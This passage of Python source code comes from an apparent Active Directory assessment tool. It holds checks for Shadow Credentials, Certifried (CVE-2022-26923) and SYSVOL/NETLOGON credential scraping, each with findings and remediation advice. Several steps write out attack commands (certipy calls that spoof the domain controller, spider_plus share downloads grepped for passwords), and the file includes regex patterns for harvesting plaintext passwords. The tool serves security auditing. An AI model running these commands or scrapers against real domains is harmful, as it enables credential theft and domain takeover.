                    "DACL-controlled), it enables impersonating them via "
                    "PKINIT without knowing/resetting their password."
                ),
                evidence=text[:600],
                remediation=(
                    "Review and restrict write access to msDS-KeyCredentialLink; "
                    "it should not be broadly self-writable in hardened "
                    "environments."
                ),
            )
        )
        result.add_step(
            PathStep(
                name="Shadow Credentials write confirmed",
                technique="Shadow-Credentials",
                requires=frozenset({Capability.LOW_PRIV_USER}),
                grants=Capability.SHADOW_CRED_WRITABLE,
                command=(
                    "certipy shadow auto -u USER@DOMAIN -p PASS -account TARGET "
                    "-dc-ip DC-IP"
                ),
                description=(
                    "Confirmed msDS-KeyCredentialLink is writable; combine with "
                    "DACL control over another principal to impersonate them."
                ),
                reliability=Reliability.HIGH,
                noise=Noise.QUIET,
                source="check",
            )
        )
    else:
        signal = looks_like_failure(text)
        if signal:
            result.mark_inconclusive(
                f"Shadow Credentials check inconclusive; output shows '{signal}'"
            )
        elif not re.search(r"keycredentiallink|shadow", text, re.IGNORECASE):
            result.mark_inconclusive(
                "certipy shadow produced no recognizable output (module "
                "unavailable or output changed)"
            )
    return result


def check_certifried(runner: ToolRunner, target: Target, timeout: int = 180) -> CheckResult:
    """Detect Certifried (CVE-2022-26923) exposure - LDAP attribute spoofing
    on a self-created machine account.

    Distinct from noPac (a Kerberos PAC/ticket bug, patched separately):
    Certifried is an LDAP write bug where an account that owns a computer
    object it created (via MachineAccountQuota) can rewrite that object's
    ``dNSHostName``/``sAMAccountName`` to spoof a more privileged computer
    (such as the DC itself) before requesting a certificate, yielding a
    certificate that authenticates as the spoofed principal. The vulnerable
    condition is simply "MachineAccountQuota > 0 and the May 2022 AD updates
    are not confirmed installed" - this check reuses the MAQ read already
    performed by :func:`check_machine_account_quota` to flag the risk rather
    than duplicating the LDAP query, and never performs the (destructive)
    rename itself.
    """
    name = "Certifried (CVE-2022-26923) - LDAP attribute spoofing"
    guard = _guard(runner, target, name)
    if guard:
        return guard

    result = _base_result(name)
    argv = ["nxc", "ldap", target.host, *target.nxc_auth_args(), "-M", "maq"]
    out = runner.run(argv, timeout=timeout)
    result.command = out.command
    result.raw_output = out.combined
    result.return_code = out.return_code
    result.duration_seconds = out.duration_seconds
    if out.error:
        result.error = out.error
        return result

    m = re.search(r"MachineAccountQuota:\s*(\d+)", out.combined)
    if m and int(m.group(1)) > 0:
        result.add_finding(
            Finding(
                title="Certifried (CVE-2022-26923) precondition present",
                severity=Severity.CRITICAL,
                target=target.domain or target.host,
                description=(
                    f"MachineAccountQuota is {m.group(1)}, so the account can "
                    "create a computer object. If the May 2022 Active "
                    "Directory updates are not installed, an attacker can "
                    "rename a self-created computer object's dNSHostName to "
                    "spoof the DC, request a certificate as it, and "
                    "authenticate as the DC via PKINIT - a direct route to "
                    "DCSync / Domain Admin."
                ),
                evidence=m.group(0),
                remediation=(
                    "Apply the May 2022 Active Directory updates "
                    "(CVE-2022-26923) on all DCs, and set "
                    "ms-DS-MachineAccountQuota to 0."
                ),
            )
        )
        result.add_step(
            PathStep(
                name="Certifried: spoof DC via owned machine account",
                technique="Certifried",
                requires=frozenset({Capability.MACHINE_ACCOUNT}),
                grants=Capability.CERT_AS_DA,
                command=(
                    "certipy account update -u USER@DOMAIN -p PASS "
                    "-user 'PWN$' -dns 'DC-NAME'  &&  "
                    "certipy req -u 'PWN$@DOMAIN' -p 'Passw0rd!' -ca CA-NAME "
                    "-template Machine -dc-ip DC-IP"
                ),
                description=(
                    "Rename a self-created machine account's dNSHostName to "
                    "the DC's name, then request a Machine-template "
                    "certificate that authenticates as the DC."
                ),
                reliability=Reliability.MODERATE,
                noise=Noise.MODERATE,
                detail="unpatched (May 2022) DC required",
                source="check",
            )
        )
    return result


# File extensions worth scraping for embedded credentials: deployment/config
# files and scripts that routinely carry them, beyond the GPP XML already
# covered by check_gpp_cpassword.
_SCRAPE_EXTS = (
    "xml", "config", "ini", "vbs", "ps1", "bat", "cmd", "txt", "inf",
)

# Patterns that indicate an embedded credential in script/config content.
# Conservative and line-oriented so ordinary text is not mistaken for a find.
_CRED_PATTERNS: tuple[re.Pattern[str], ...] = (
    # unattend.xml / sysprep answer files: <Password><Value>...</Value></Password>
    re.compile(
        r"<Password>\s*<Value>([^<]+)</Value>.*?</Password>",
        re.IGNORECASE | re.DOTALL,
    ),
    # web.config connection strings: User ID=x;Password=y / uid=x;pwd=y
    re.compile(
        r"(?:User ID|uid)\s*=\s*([^;]+);\s*(?:Password|pwd)\s*=\s*([^;\"']+)",
        re.IGNORECASE,
    ),
    # scripts: net use / psexec-style embedded creds, or a plain assignment.
    re.compile(
        r"(?:password|pwd|pass)\s*[:=]\s*[\"']?([^\s\"'<>]{4,})",
        re.IGNORECASE,
    ),
)


def _scrape_credentials_from_dir(root) -> list[tuple[str, str]]:
    """Walk a downloaded-share directory and return (relative path, match)
    pairs for files whose content matches a known credential pattern.

    Kept as a small, isolated helper (rather than inline in the check) so it
    can be unit-tested directly against a tmp_path fixture without needing
    nxc/spider_plus installed.
    """
    from pathlib import Path as _Path

    root = _Path(root)
    hits: list[tuple[str, str]] = []
    if not root.exists():
        return hits
    for path in sorted(root.rglob("*")):
        if not path.is_file():
            continue
        if path.suffix.lstrip(".").lower() not in _SCRAPE_EXTS:
            continue
        try:
            text = path.read_text(encoding="utf-8", errors="replace")
        except OSError:
            continue
        for pattern in _CRED_PATTERNS:
            for m in pattern.finditer(text):
                snippet = m.group(0).strip()[:200]
                try:
                    rel = str(path.relative_to(root))
                except ValueError:
                    rel = str(path)
                hits.append((rel, snippet))
    return hits


def check_sysvol_script_credentials(
    runner: ToolRunner, target: Target, timeout: int = 300
) -> CheckResult:
    """Scrape SYSVOL/NETLOGON content beyond GPP XML for embedded credentials.

    GPP cpassword (see :func:`check_gpp_cpassword`) only covers the specific,
    publicly-decryptable XML attribute. Deployment scripts, answer files
    (``unattend.xml``), and config files (``web.config``) left on SYSVOL or
    NETLOGON routinely carry plaintext credentials by other means - a
    hardcoded ``net use`` password, a sysprep ``<Password>`` block, or a
    connection-string ``Password=``. This downloads share content via
    NetExec's ``spider_plus`` module (download-and-report; it does not match
    content itself) into a temporary folder, then scans the downloaded files
    for those patterns.
    """
    name = "SYSVOL / NETLOGON script credential scraping"
    guard = _guard(runner, target, name)
    if guard:
        return guard

    result = _base_result(name)

    import tempfile

    with tempfile.TemporaryDirectory(prefix="domainerator-spider-") as tmpdir:
        argv = [
            "nxc", "smb", target.host, *target.nxc_auth_args(),
            "-M", "spider_plus", "-o", "DOWNLOAD_FLAG=True",
            f"OUTPUT_FOLDER={tmpdir}",
        ]
        out = runner.run(argv, timeout=timeout)
        result.command = out.command
        result.raw_output = out.combined
        result.return_code = out.return_code
        result.duration_seconds = out.duration_seconds
        if out.error:
            result.error = out.error
            return result

        if runner.dry_run:
            # Nothing was actually downloaded in dry-run; nothing to scrape.
            return result

        hits = _scrape_credentials_from_dir(tmpdir)

    if hits:
        evidence_lines = [f"{path}: {snippet}" for path, snippet in hits[:20]]
        result.raw_output += "\n\n--- credential scrape matches ---\n" + "\n".join(
            evidence_lines
        )
        result.add_finding(
            Finding(
                title="Embedded credentials found in SYSVOL/NETLOGON content",
                severity=Severity.HIGH,
                target=target.domain or target.host,
                description=(
                    f"{len(hits)} embedded credential-shaped string(s) were "
                    "found in SYSVOL/NETLOGON scripts or config files "
                    "(deployment scripts, unattend.xml, web.config, etc.), "
                    "distinct from the GPP cpassword attribute."
                ),
                evidence="\n".join(evidence_lines),
                remediation=(
                    "Remove hardcoded credentials from scripts and config "
                    "files on SYSVOL/NETLOGON; use gMSA or a secrets vault "
                    "instead, and rotate any exposed passwords."
                ),
            )
        )
        result.add_step(
            PathStep(
                name="Scrape SYSVOL/NETLOGON scripts -> credentials",
                technique="SYSVOL-script-creds",
                requires=frozenset({Capability.LOW_PRIV_USER}),
                grants=Capability.VALID_CREDENTIALS,
                command=(
                    f"nxc smb {target.host} -u USER -p PASS -M spider_plus "
                    "-o DOWNLOAD_FLAG=True OUTPUT_FOLDER=./sysvol-dump  "
                    "# then grep -ri password ./sysvol-dump"
                ),
                description=(
                    "Download SYSVOL/NETLOGON content and grep scripts/config "
                    "files for hardcoded credentials."
                ),
                reliability=Reliability.SPECULATIVE,
                noise=Noise.QUIET,
                detail=f"{len(hits)} match(es)",
                source="check",
            )
        )
    else:
        signal = looks_like_failure(out.combined)
        if signal:
            result.mark_inconclusive(
                f"spider_plus download inconclusive; output shows '{signal}'"
            )
    return result


def _mark_inconclusive_on_failure(results: list[CheckResult]) -> list[CheckResult]:
    """Post-process: a ran-but-empty check whose output shows a connection or
    auth failure is inconclusive, not clean.

    Centralising this keeps every authenticated check from repeating the same
    boilerplate while ensuring a failed auth/connection is never silently read
    as "not vulnerable".
    """
    for r in results:
        if r.skipped or r.error or r.findings or r.inconclusive:
            continue
        signal = looks_like_failure(r.raw_output)
        if signal:
            r.mark_inconclusive(
                f"check ran but output shows '{signal}'; result may not reflect "
                "the target's true state"
            )
    return results


def run_all(runner: ToolRunner, target: Target, timeout: int = 300) -> list[CheckResult]:
    """Run every authenticated check and return the results."""
    results = [
        check_admin_access(runner, target, timeout=min(timeout, 120)),
        check_password_policy(runner, target, timeout=min(timeout, 120)),
        check_kerberoast(runner, target, timeout=timeout),
        check_delegation(runner, target, timeout=min(timeout, 180)),
        check_machine_account_quota(runner, target, timeout=min(timeout, 120)),
        check_rbcd(runner, target, timeout=min(timeout, 240)),
        check_coercion(runner, target, timeout=min(timeout, 180)),
        check_nopac(runner, target, timeout=min(timeout, 180)),
        check_gpp_cpassword(runner, target, timeout=min(timeout, 180)),
        check_sysvol_script_credentials(runner, target, timeout=min(timeout, 300)),
        check_pre2k_computers(runner, target, timeout=min(timeout, 180)),
        check_laps_readability(runner, target, timeout=min(timeout, 180)),
        check_gmsa_readability(runner, target, timeout=min(timeout, 180)),
        check_dnsadmins_membership(runner, target, timeout=min(timeout, 180)),
        check_shadow_credentials_writable(runner, target, timeout=min(timeout, 180)),
        check_certifried(runner, target, timeout=min(timeout, 180)),
    ]
    return _mark_inconclusive_on_failure(results)
